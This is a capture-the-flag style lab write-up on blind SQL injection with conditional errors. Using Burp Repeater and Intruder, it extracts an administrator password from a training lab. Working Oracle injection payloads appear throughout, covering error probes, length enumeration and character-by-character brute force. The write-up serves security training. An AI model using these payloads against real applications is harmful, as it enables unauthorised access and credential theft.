
# Lab: Blind SQL injection with conditional errors

## Lab Information

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message.

The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.

To solve the lab, log in as the `administrator` user


## Steps to Reproduce

### Checking Parameter Vulnerability

- Start BurpSuite and intercept the request sent to the homepage of the web app.
- Send the request to Repeater.
- After inserting extra `'` in the **Tracking Id** we get **Internal Server Error**.
- The **Tracking Id** is vulnerable to SQLi.

### Testing Error Entries

- Giving the below payload gives an error.

```sql
' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE 'a' END FROM DUAL)--
```

- Giving the below payload doesn't give any error.

```sql
' AND (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE 'a' END FROM DUAL)='a'--
```

### Checking User Entry

- The below payload produces no errors indicating the `administrator` user does exist in the database.

```sql
' AND (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a'--
```

### Finding password length

- Send the request to Burp Intruder.
- Add the payload to the position as shown below.
- Payload Configuration :-
	- Payload Type -> Numbers
	- Start -> 1
	- End -> 50
	- Step -> 1

- The last error message comes in the request `LENGTH(password) > 19` . So the password length is 20.

```sql
' AND (SELECT CASE WHEN LENGTH(password) > §§ THEN to_char(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a'--
```

### Bruteforcing Password

- Use BurpSuite **CLUSTER BOMB ATTACK**.
- **Payload 1 Configuration**
    - `§1§` is the **INDEX VALUE**.
    - `§1§` should contain numbers from 1 to **length of the password**.
    - `Payload Type -> Numbers`, `Start -> 1`, `End -> length of password`, `Step -> 1`
    - Testing each character from the **payload 2** wordlist against each index of the password value.
- **Payload 2 Configuration**
    - `§2§` is the **WORDLIST CHARACTER**.
    - `§2§` will contain one character each line.
    - `Payload Type -> Bruteforcer` , `Character Set -> abcdefghijklmnopqrstuvwxyz0123456789`, `Min Length -> 1 Max Length -> 1`
    
- If error is produced then **true** else **false**. It means if error then character matches index character value. Use the BurpSuite to look for these error requests. 

```sql
' AND (SELECT CASE WHEN SUBSTR(password,§1§,1)='§2§' THEN to_char(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a'--
```

- After bruteforcing I got the `administrator` password which is `aozfncuoqwo8ir1pqj8l`.

